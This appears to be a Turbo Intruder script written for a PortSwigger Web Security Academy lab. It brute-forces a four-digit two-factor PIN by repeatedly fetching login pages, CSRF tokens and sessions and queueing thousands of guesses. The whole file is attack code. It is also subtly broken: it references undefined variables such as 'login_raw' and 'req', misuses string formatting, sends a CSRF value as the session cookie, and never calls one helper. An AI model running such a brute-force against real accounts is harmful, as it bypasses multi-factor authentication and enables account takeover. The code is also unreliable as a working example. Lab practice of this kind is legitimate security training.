Host = "0af6007f0412eae4c0c12a5300a5004e"

def engine():
    engine = ""


def login_1(Host):     
    login1_raw = 'GET /login HTTP/1.1\r\nHost: {%s}.web-security-academy.net\r\nCookie: session=DUOR5FCcH5fqbykUnm7w3BuEuaOZPyOE\r\nConnection: close\r\n\r\n'.format(Host)
    login1 = '"""' + login_raw + '"""'
    engine.queue(target.req, login1)
    csrf = req.response.find(name="csrf")
    return csrf

def login_2(Host, csrf_value):    
    login2 = 'GET /login HTTP/1.1\r\nHost: {%s}.web-security-academy.net\r\nCookie: session={%s}\r\nConnection: close\r\n'.format(Host, csrf_value)
    engine.queue(target.req, login2)
    session = req.response.find(name="session")
    return session

def login_3(Host, session):    
    login3 = 'GET /login2 HTTP/1.1\r\nHost: {%s}.web-security-academy.net\r\nCookie: session={%s}\r\nConnection: close\r\n'.format(Host, session)
    engine.queue(target.req, login3)
    csrf2 = req.response.find(name="csrf")
    return csrf2

def login_4(Host, csrf2):    
    login4 = 'POST /login2 HTTP/1.1\r\nHost: {%s}.web-security-academy.net\r\nCookie: session={%s}\r\nConnection: close'.format(Host, csrf2)
    engine.queue(target.req, login4)
    return 
    
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=5,
                           engine=Engine.BURP, 
                           pipeline=False
                           ) 
    pin=0
    for i in range(5000):
        csrf1 = login_1(Host)
        session = login_2(Host, csrf1)
        csrf_mfa = login_3(Host, session)
                
        guess = str(pin).zfill(4)
        engine.queue(target.req, [Host, session, csrf_mfa, guess])
        pin += 1
        guess = str(pin).zfill(4)
        engine.queue(target.req, [Host, session, csrf_mfa, guess])


def handleResponse(req, interesting):
    if 'Incorrect security code' not in req.response or req.status == 302:
            table.add(req)


